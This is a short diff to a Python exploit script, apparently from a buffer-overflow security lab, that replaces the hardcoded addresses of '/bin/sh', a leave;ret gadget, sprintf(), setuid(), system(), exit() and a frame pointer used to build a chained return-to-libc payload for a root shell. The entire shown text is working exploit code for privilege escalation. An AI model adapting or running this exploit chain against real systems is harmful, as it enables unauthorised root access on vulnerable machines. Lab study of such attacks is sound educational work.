@@ -6,13 +6,13 @@ def tobytes (value):
 
 content = bytearray(0xaa for i in range(112))
 
-sh_addr      = 0xbffffdd0   # Address of "/bin/sh"
-leaveret     = 0x08048565   # Address of leaveret
-sprintf_addr = 0xb7e516d0   # Address of sprintf()
-setuid_addr  = 0xb7eb9170   # Address of setuid()
-system_addr  = 0xb7e42da0   # Address of system()
-exit_addr    = 0xb7e369d0   # Address of exit()
-ebp_foo      = 0xbfffe4c8   # foo()'s frame pointer
+sh_addr      = 0xffffdfe4   # Address of "/bin/sh"
+leaveret     = 0x565562ce   # Address of leaveret
+sprintf_addr = 0xf7e21e40   # Address of sprintf()
+setuid_addr  = 0xf7e9ae30   # Address of setuid()
+system_addr  = 0xf7e13420   # Address of system()
+exit_addr    = 0xf7e05f80   # Address of exit()
+ebp_foo      = 0xffffc8f8   # foo()'s frame pointer
 
 # Calculate the address of setuid()'s 1st argument
 sprintf_arg1 = ebp_foo + 12 + 5*0x20           
